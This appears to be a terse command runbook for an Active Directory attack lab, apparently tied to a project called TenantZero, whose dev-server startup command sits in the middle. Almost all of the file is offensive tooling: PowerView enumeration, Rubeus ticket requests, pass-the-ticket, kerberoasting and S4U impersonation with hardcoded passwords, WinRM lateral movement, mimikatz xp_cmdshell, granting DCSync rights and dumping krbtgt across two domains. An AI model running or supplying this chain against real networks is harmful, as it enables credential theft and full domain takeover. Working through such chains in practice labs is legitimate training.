# WKSTN01
execute-assembly PowerView.ps1 Get-DomainUser -SPN
type C:\Users\jsmith\Desktop\itwiki.txt
execute-assembly Rubeus.exe asktgt /user:awalker /password:Autumn2024!
execute-assembly Rubeus.exe ptt /ticket:awalker.kirbi
jump winrm FILESVR01

# FILESVR01
execute-assembly Rubeus.exe kerberoast /user:svc_backup
execute-assembly Rubeus.exe s4u /user:svc_backup /impersonateuser:Administrator /msdsspn:MSSQLSvc/SQLSVR01.meridian.local:1433 /ntlm:BackupSvc2019!
jump winrm SQLSVR01

# SQLSVR01
execute-assembly Rubeus.exe ptt /ticket:administrator_sqlsvr01_meridian_local_1433.kirbi
execute-assembly Rubeus.exe triage
execute-assembly mimikatz.exe "sql::xpcmdshell"
execute-assembly mimikatz.exe "sql::xpcmdshell /cmd:whoami"
jump winrm DC01

# DC01
execute-assembly PowerView.ps1 Add-DomainObjectAcl -TargetIdentity "DC=meridian,DC=local" -PrincipalIdentity awalker -Rights DCSync
execute-assembly mimikatz.exe "lsadump::dcsync /domain:meridian.local /user:krbtgt"


cd ~/Desktop/projects/TenantZero/server &&   export DATABASE_URL="postgres://tenantzero:tenantzero@localhost/tenantzero?sslmode=disable" &&   export JWT_SECRET="dev-secret-change-in-prod" &&   export LABS_DIR="../labs" &&   go run .


execute-assembly Rubeus.exe asktgt /user:svc_link /password:LinkSvc2022! /domain:alpine.corp
execute-assembly Rubeus.exe triage
jump winrm DEVWKSTN01
whoami
jump winrm ALPHADC01
execute-assembly mimikatz.exe "lsadump::dcsync /domain:alpine.corp /user:krbtgt"